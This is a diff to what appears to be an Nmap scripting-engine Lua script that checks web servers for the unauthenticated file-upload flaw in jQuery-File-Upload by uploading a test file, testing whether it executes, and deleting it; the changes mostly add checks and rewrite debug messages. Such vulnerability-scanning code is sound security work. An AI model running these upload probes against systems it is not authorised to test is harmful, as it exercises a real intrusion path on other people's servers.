@@ -109,6 +109,8 @@ local function locate_plugin(response_body, host, port)
   local plugin_name = nil
   local plugin_name_suffix = nil
 
+  stdnse.debug1('Trying to locate the plugin itself.')
+
   -- Find if the given URI has the plugin, with either casing
   for i, _plugin_name in ipairs(plugin_names) do
     -- Escape dashes to use in a regular expression
@@ -128,20 +130,20 @@ local function locate_plugin(response_body, host, port)
 
   -- If the plugin was not found, fail
   if plugin_path == nil or plugin_name == nil then
-    stdnse.debug1('Plugin not found (method 1 of 2)')
+    stdnse.debug1('Plugin not found')
     return nil
   end
 
   -- Targets, can have an HTML src attribute value of a URL, relative path or absolute path
   plugin_path = format_plugin_path(plugin_path .. plugin_name .. '/server/php/')
-  stdnse.debug1('Plugin URI found: %s (method 1 of 2)', plugin_path)
+  stdnse.debug1('Plugin URI found: %s', plugin_path)
 
   -- Test if we can access the vulnerable plugin
   if plugin_exists(host, port, plugin_path) then
-    stdnse.debug1('Plugin responded successfully at URI: %s (method 1 of 2)', plugin_path)
+    stdnse.debug1('Plugin responded successfully at URI: %s', plugin_path)
     return plugin_path
   end
-  stdnse.debug1('Plugin not found at URI: %s (method 1 of 2)', plugin_path)
+  stdnse.debug1('Invalid response when requested the plugin URI: %s', plugin_path)
 
   return nil
 end
@@ -151,8 +153,9 @@ end
 -- Locates the plugins directory in the given URI's source code
 -- and guesses the path of the vulnerable plugin.
 local function locate_plugins_directory(response_body, host, port)
+  stdnse.debug1('Trying to locate the plugins directory.')
   -- Find if the given URI has the plugin, with either casing
-  found, _, plugins_path = string.find(response_body, '.*[\"\'](.-)plugins%/')
+  local found, _, plugins_path = string.find(response_body, '.*[\"\'](.-)plugins%/')
 
   -- If the plugin directory was not found, fail
   if found == nil then
@@ -202,58 +205,65 @@ local function exploit(host, port, plugin_path)
     return false
   end
   stdnse.debug1('Upload request was successful.')
-
-  -- Check if the file has been uploaded
-  response = http.get(host, port, plugin_path, { redirect_ok = true, no_cache = true })
-  -- Some plugin versions add a random suffix at the filename
-  if response.status ~= 200 or not response.body:match(random_filename_no_ext .. '.*' .. random_file_ext:gsub('%.', '%%.')) then
-    stdnse.debug1('Uploaded file not found on file list.')
-    return false
-  end
-
-  stdnse.debug1('Uploaded file exists on the file list!')
+  stdnse.debug1('The host is vulnerable, but going to make some additional tests regarding the uploaded file.')
 
   --
   -- The following do not affect the result if vulnerable or not, they are additional checks.
   --
 
-  -- Check if the file is executable
-  -- Some versions add a random suffix to the uploaded file. Get it!
-  _, _, random_filename_suffix = string.find(response.body, '.*"' .. random_filename_no_ext .. '(.-)' .. random_file_ext:gsub('%.', '%%.') .. '".*')
-  random_filename = random_filename_no_ext .. random_filename_suffix .. random_file_ext
+  -- Check if the file has been uploaded
+  response = http.get(host, port, plugin_path, { redirect_ok = true, no_cache = true })
+  -- Some plugin versions add a random suffix at the filename
+  if response.status == 200 and response.body:match(random_filename_no_ext .. '.*' .. random_file_ext:gsub('%.', '%%.')) then
+    stdnse.debug1('Uploaded file exists on the file list!')
+
+    -- Some versions add a random suffix to the uploaded file. Get it!
+    local _, _, random_filename_suffix = string.find(response.body, '.*"' .. random_filename_no_ext .. '(.-)' .. random_file_ext:gsub('%.', '%%.') .. '".*')
+    random_filename = random_filename_no_ext .. random_filename_suffix .. random_file_ext
+  else
+    stdnse.debug1('Uploaded file not found on file list. Will continue to evaluate the file assuming the target didn\'t rename it.')
+  end
 
   -- The uploaded files can be stored to a completely different directory than the plugin.
   -- Let's find out the file's real path.
   stdnse.debug1('Getting uploaded file information.')
   response = http.get(host, port, plugin_path .. '/?file=' .. random_filename, { redirect_ok = true, no_cache = true })
-  if response.status ~= 200 then
-    stdnse.debug1('Server responded with an error.')
+  local content_type = response.header['content-type'] or ''
+  if response.status ~= 200 or response.body == '' or not (content_type:find('^text/plain') or content_type == 'application/json') then
+    stdnse.debug1('Server responded with an error while trying to get the file information.')
     return true
   end
 
   -- Parse the file information response
   json_status, response_json = json.parse(response.body);
-  if json_status == nil then
+  if json_status == false then
     stdnse.debug1('Could not get file information. JSON response could not be parsed.')
     return true
   end
 
-  -- It is possible that the file URL doesn't have a scheme.
-  -- That breaks parsing the URL.
-  local file_url = response_json.file.url
-  if url.parse(file_url).scheme == nil then
-    file_url = 'http://' .. file_url
+  local file_path = nil
+  if response_json.file and type(response_json.file) == 'table' and response_json.file.url then
+    local file_url = response_json.file.url
+    -- It is possible that the file URL doesn't have a scheme.
+    -- That breaks parsing the URL.
+    if url.parse(file_url).scheme == nil then
+      file_url = 'http://' .. file_url
+    end
+    -- Get the path of the uploaded file, so we can request it.
+    file_path = url.parse(file_url).path
+  else
+    stdnse.debug1('Could get the uploaded file URL in JSON response.')
+    return true
   end
-  -- Get the path of the uploaded file, so we can request it.
-  local file_path = url.parse(file_url).path
 
   -- Check if the file is executable
+  stdnse.debug1('Checking if the uploaded file is executable.')
   local message = ''
-  response = http.get(host, port, file_url, { redirect_ok = true, no_cache = true })
+  response = http.get(host, port, file_path, { redirect_ok = true, no_cache = true })
   if response.status == 200 and response.body == 'Hey!' then
     message = 'File is executable!'
   elseif response.status ~= 200 then
-    message = 'Request for uploaded file returned status "' .. response.status .. '" (possibly renamed to something random).'
+    message = 'Request for uploaded file failed with status "' .. response.status .. '".'
   elseif response.body == content then
     message = 'Uploaded file was found but is not executable (content returned as plain text).'
   else
@@ -264,8 +274,14 @@ local function exploit(host, port, plugin_path)
   table.insert(vuln_table.extra_info, message)
 
   -- Delete the file
-  local delete_url = response_json.file.deleteUrl
   stdnse.debug1('Deleting uploaded file.')
+  if not response_json.file.deleteUrl then
+    stdnse.debug1('Delete URL could not be found in file information.')
+    return true
+  end
+  local delete_url = response_json.file.deleteUrl
+  stdnse.debug1('Delete URL found.')
+
   response = http.generic_request(host, port, 'DELETE', delete_url, { redirect_ok = true, no_cache = true })
   if response.status ~= 200 then
     stdnse.debug1('File could not be deleted.')
@@ -307,7 +323,7 @@ Unauthenticated arbitrary file upload vulnerability on jQuery-File-Upload <= v9.
   response = http.get(host, port, uri, { redirect_ok = true, no_cache = true })
   if response.status ~= 200 or response == nil or response.body == nil then
     stdnse.debug1('Target returned an invalid response.')
-    return nil
+    return vuln_report:make_output(vuln_table)
   end
 
   -- Method 1, most accurate, locates the plugin in given URI's source
